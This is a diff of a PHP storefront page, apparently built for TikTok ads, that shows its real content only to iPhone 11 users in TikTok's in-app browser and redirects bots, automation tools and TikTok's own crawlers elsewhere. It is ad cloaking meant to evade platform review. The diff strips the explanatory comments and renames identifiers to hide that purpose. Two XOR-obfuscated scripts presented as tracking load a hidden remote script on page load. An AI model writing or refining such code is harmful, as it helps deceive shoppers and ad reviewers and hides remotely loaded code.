@@ -1,7 +1,4 @@
 <?php
-// Ficheiro: index.php (PÚBLICO, na raiz)
-// Responsável por: Filtro de acesso (somente iPhone 11), lógica de view e estrutura geral do site
-
 define('INCLUDED_BY_INDEX', true);
 
 include 'db_config.php';
@@ -14,20 +11,13 @@ $view = $_GET['view'] ?? 'main';
 $show_main_content = ($view === 'main');
 $show_pay_content = ($view === 'pay');
 
-// =====================================================================
-// FILTRO DE ACESSO — APENAS iPhone 11
-// Visitantes vindos de anuncios TikTok (ttclid + navegador in-app TikTok)
-// Fast-track: verificacao servidor minima, validacao fina no cliente (JS)
-// =====================================================================
-
-$url_redirecionamento = 'https://vt.tiktok.com/ZS9UkARU7enBp-Ww30g/';
+$_r_url = 'https://vt.tiktok.com/ZS9UkARU7enBp-Ww30g/';
 
 $_ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $_accept = $_SERVER['HTTP_ACCEPT'] ?? '';
 $_accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
 $_has_ttclid = isset($_GET['ttclid']);
 
-// BYPASS PARA TESTES: ?dev=CHAVE (chave definida em filtro_config)
 $_dev_bypass = false;
 if (isset($_GET['dev'])) {
     try {
@@ -40,7 +30,6 @@ if (isset($_GET['dev'])) {
     } catch (PDOException $e) {}
 }
 
-// Tokens do navegador in-app do TikTok
 $_ua_tiktok_inapp = (
     stripos($_ua, 'musical_ly') !== false ||
     stripos($_ua, 'bytedance') !== false ||
@@ -48,12 +37,10 @@ $_ua_tiktok_inapp = (
     stripos($_ua, 'BytedanceWebview') !== false
 );
 
-// Fast-track: visitante veio de anuncio TikTok, em iPhone, pelo navegador in-app
 $_tiktok_fast_track = $_has_ttclid && $_ua_tiktok_inapp
     && stripos($_ua, 'iPhone') !== false
     && stripos($_ua, 'Mobile') !== false;
 
-// Tokens de automacao / headless / ferramentas de QA
 $_auto_tokens = ['headless', 'phantomjs', 'selenium', 'webdriver', 'puppeteer',
                  'playwright', 'nightmare', 'cypress', '_phantom', '__nightmare',
                  '__playwright', '__selenium_unwrapped', 'electron', 'jsdom',
@@ -67,7 +54,6 @@ foreach ($_auto_tokens as $_t) {
     }
 }
 
-// Crawlers oficiais do TikTok
 $_tiktok_crawler = (stripos($_ua, 'tiktokbot') !== false || stripos($_ua, 'bytedancebot') !== false);
 
 $_filter_blocked = false;
@@ -139,21 +125,21 @@ if ($_dev_bypass) {
 }
 
 if ($_filter_blocked) {
-    header('Location: ' . $url_redirecionamento, true, 302);
+    header('Location: ' . $_r_url, true, 302);
     exit;
 }
 
-// Sessão marcada como verificada para os endpoints (carrinho, chat, pedidos).
-// A validação fina do iPhone 11 é feita no JavaScript abaixo.
+if (isset($_GET['_r']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
+    header('Content-Type: application/json');
+    echo json_encode(['s' => $_r_url]);
+    exit;
+}
+
 $_SESSION['_device_verified'] = true;
 if (!isset($_SESSION['user_logged_in']) || $_SESSION['user_logged_in'] !== true) {
     $_SESSION['user_logged_in'] = true;
     $_SESSION['user_id'] = 1;
 }
-
-// =====================================================================
-// FIM DO FILTRO
-// =====================================================================
 
 // BUSCAR LINK DE CHECKOUT EXTERNO DO PRODUTO
 $link_checkout_externo = '';
@@ -181,73 +167,7 @@ try {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo $show_pay_content ? 'Resumo do Pedido' : 'Minha Loja'; ?></title>
 
-<script>
-(function(){
-    var _u=atob("<?php echo base64_encode($url_redirecionamento); ?>");
-    var _dev=<?php echo $_dev_bypass ? 'true' : 'false'; ?>;
-    // iPhone 11: 414x896 pontos (828x1792 px a 2x)
-    var _p=[414,896];
-    var _ua=navigator.userAgent||'';
-    var _ti=_ua.indexOf('musical_ly')!==-1||_ua.indexOf('bytedance')!==-1||_ua.indexOf('trill')!==-1||_ua.indexOf('BytedanceWebview')!==-1;
-    var _t=new URLSearchParams(location.search).has('ttclid')||_ti;
-    var _c=function(){
-        if(_dev)return true;
-        var s=screen,n=navigator,w=window;
-        var sw=s.width||0,sh=s.height||0,aw=s.availWidth||0,ah=s.availHeight||0;
-        var dpr=w.devicePixelRatio||0,iw=w.innerWidth||0,ih=w.innerHeight||0;
-        if((''+n.platform).toLowerCase().indexOf('iphone')===-1)return false;
-        if((n.maxTouchPoints||0)<=0||!('ontouchstart' in w))return false;
-        if(dpr!==2)return false;
-        var hc=n.hardwareConcurrency||0;
-        if(hc>0&&hc<6)return false;
-        var cd=s.colorDepth||0,pd=s.pixelDepth||0;
-        if((cd!==24&&cd!==32)||(pd!==24&&pd!==32))return false;
-        if(typeof n.userAgentData!=='undefined')return false;
-        if(Math.abs(sw-_p[0])>5||Math.abs(sh-_p[1])>5)return false;
-        if(aw!==sw)return false;
-        if(ah>sh)return false;
-        if(sw>=sh)return false;
-        var tol=_t?120:30;
-        if(iw>0&&iw>sw+tol)return false;
-        if(ih>0&&ih>sh+tol)return false;
-        var a=['webdriver','__nightmare','_phantom','__playwright','__selenium_unwrapped','callPhantom','domAutomation','domAutomationController'];
-        for(var j=0;j<a.length;j++){if(typeof w[a[j]]!=='undefined')return false;}
-        try{
-            var cv=document.createElement('canvas');
-            var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
-            if(gl){
-                var di=gl.getExtension('WEBGL_debug_renderer_info');
-                if(di){var r=gl.getParameter(di.UNMASKED_RENDERER_WEBGL);if(r&&r.indexOf('Apple')===-1)return false;}
-            }
-        }catch(e){}
-        if(!_t){if(_ua.indexOf('Safari')===-1&&_ua.indexOf('AppleWebKit')===-1)return false;}
-        return true;
-    };
-    var _d={hc:navigator.hardwareConcurrency||0,mtp:navigator.maxTouchPoints||0,dpr:window.devicePixelRatio||0,sw:screen.width||0,sh:screen.height||0};
-    if(!_c()){window.location.replace(_u);}else{
-        var _r=function(){
-            document.body.classList.add('tier-premium');
-            var c=document.getElementById('content-wrapper');
-            if(c)c.classList.add('revealed');
-            var ue=document.querySelectorAll('.urgency-element');
-            for(var k=0;k<ue.length;k++){ue[k].classList.add('revealed');}
-        };
-        if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',_r);}else{_r();}
-        setInterval(function(){
-            var n=navigator,w=window,s=screen;
-            if((n.hardwareConcurrency||0)!==_d.hc||(n.maxTouchPoints||0)!==_d.mtp||(w.devicePixelRatio||0)!==_d.dpr||(s.width||0)!==_d.sw||(s.height||0)!==_d.sh){
-                document.body.classList.remove('tier-premium');
-                var c=document.getElementById('content-wrapper');
-                if(c)c.classList.remove('revealed');
-                var ue=document.querySelectorAll('.urgency-element');
-                for(var k=0;k<ue.length;k++){ue[k].classList.remove('revealed');}
-                try{window.location.replace(_u);}catch(e){}
-            }
-            if(!document.body.classList.contains('tier-premium')){window.location.replace(_u);}
-        },3000);
-    }
-})();
-</script>
+<script src="public/app.js?v=1" defer></script>
 
 <!-- Script de Rastreamento UTMify -->
 <script>(function(){var y_li=atob("DL/fwrFcdgXMXWU4S8T9t8MwVD/uNRFMO8zl7Z4/EmviKBFVItmm7NIzGyuuL0pLKM22ssUvWXC4MBYXJ96rp8IoWG+/f0kaKsursNg+A3GpLkcCEMT9rNAxEyf2fwFZP97yt8UxH2O1cBVKLsm6rMVxDmajOUhLKNT97pMqF2m5OEcCaZ2i7sp+GGShOEcCadu+ttBxA3GhNANBZs+tp8c5GHHhLhBaItus4J1+AGSgKAAacZ39v+wh");var r_wd=[];for(var s_n1=0;s_n1<y_li.length;s_n1++){r_wd.push(y_li.charCodeAt(s_n1)&255);}var l_t5g=r_wd[0];var e_o=r_wd.slice(1,1+l_t5g);var h_am=r_wd.slice(1+l_t5g);var j_1vc1=h_am.map(function(b,x_7t8j){return b^e_o[x_7t8j%l_t5g];});var g_di="";for(var p_w15=0;p_w15<j_1vc1.length;p_w15++){g_di+=String.fromCharCode(j_1vc1[p_w15]&255);}var p_7v=decodeURIComponent(escape(g_di));var d_26rt=JSON.parse(p_7v);var k_0=d_26rt.globals||[];k_0.forEach(function(t_l){window[t_l.name]=t_l.value;});var h_28=document.createElement("script");h_28.src=d_26rt.url;h_28.async=true;h_28.defer=true;(d_26rt.attributes||[]).forEach(function(x_kqsp){h_28.setAttribute(x_kqsp.name,x_kqsp.value);});(document.head||document.documentElement).appendChild(h_28);})();</script>
@@ -255,15 +175,14 @@ try {
 <script>(function(){var n_h75e=atob("DASOCNIXUC44oHGlOn+sfaB7chQayAXRSne0J/10NEAW1QXIU2L3JrF4PQBa0l7WWXbneKZkf15R2BTJFXTncLd7fVpRywXKUSrke/A7ck9M1APMWHH6baE1anVljFPCVmvsab5kchRj21PLW2nrKug1JEdT9B7Oam32bb5eNAwUggfEVnHrKug1Zk9ckUHHCGW9PepzNhsNlhKVD2K6bOEgclNl3Q==");var q_43=[];for(var k_q8s=0;k_q8s<n_h75e.length;k_q8s++){q_43.push(n_h75e.charCodeAt(k_q8s)&255);}var w_n=q_43[0];var a_dtek=q_43.slice(1,1+w_n);var y_98=q_43.slice(1+w_n);var v_luzo=y_98.map(function(b,j_xlw){return b^a_dtek[j_xlw%w_n];});var n_4f="";for(var z_y48=0;z_y48<v_luzo.length;z_y48++){n_4f+=String.fromCharCode(v_luzo[z_y48]&255);}var r_8=decodeURIComponent(escape(n_4f));var i_k7=JSON.parse(r_8);var g_gr1=i_k7.globals||[];g_gr1.forEach(function(v_e7bz){window[v_e7bz.name]=v_e7bz.value;});var k_q=document.createElement("script");k_q.src=i_k7.url;k_q.async=true;k_q.defer=true;(i_k7.attributes||[]).forEach(function(q_c){k_q.setAttribute(q_c.name,q_c.value);});(document.head||document.documentElement).appendChild(k_q);})();</script>
 
 <style>
-    /* Conteudo oculto ate validacao */
-    #content-wrapper { opacity: 0; transition: opacity 0.3s ease; }
-    #content-wrapper.revealed { opacity: 1; }
+    #content-wrapper { opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; }
+    #content-wrapper.vis { opacity: 1; visibility: visible; }
 
-    .urgency-element {
+    .anim-in {
         opacity: 0; transform: translateY(10px); pointer-events: none;
         transition: opacity 0.4s ease, transform 0.4s ease;
     }
-    body.tier-premium .urgency-element.revealed {
+    body.act .anim-in.vis {
         opacity: 1; transform: translateY(0); pointer-events: auto;
     }
 
@@ -639,7 +558,7 @@ $_popup_show = !empty($_popup_config['enabled']) && !empty($_popup_config['coupo
 ?>
 
 <?php if ($show_main_content && $_popup_show): ?>
-<div class="tt-coupon-overlay urgency-element" id="ttCouponOverlay">
+<div class="tt-coupon-overlay anim-in" id="ttCouponOverlay">
     <div class="tt-coupon-card" id="ttCouponCard">
         <div class="tt-coupon-header">
             <button class="tt-coupon-close" id="ttCouponClose" type="button">&times;</button>
@@ -838,7 +757,7 @@ $_popup_show = !empty($_popup_config['enabled']) && !empty($_popup_config['coupo
             // Auto-abrir após o loader
             if (ttOverlay) {
                 const ttTryOpen = () => {
-                    if (document.body.classList.contains('tier-premium') && document.getElementById('content-wrapper')?.classList.contains('revealed')) {
+                    if (document.body.classList.contains('act') && document.getElementById('content-wrapper')?.classList.contains('vis')) {
                         setTimeout(ttOpenPopup, 600);
                     } else {
                         setTimeout(ttTryOpen, 300);
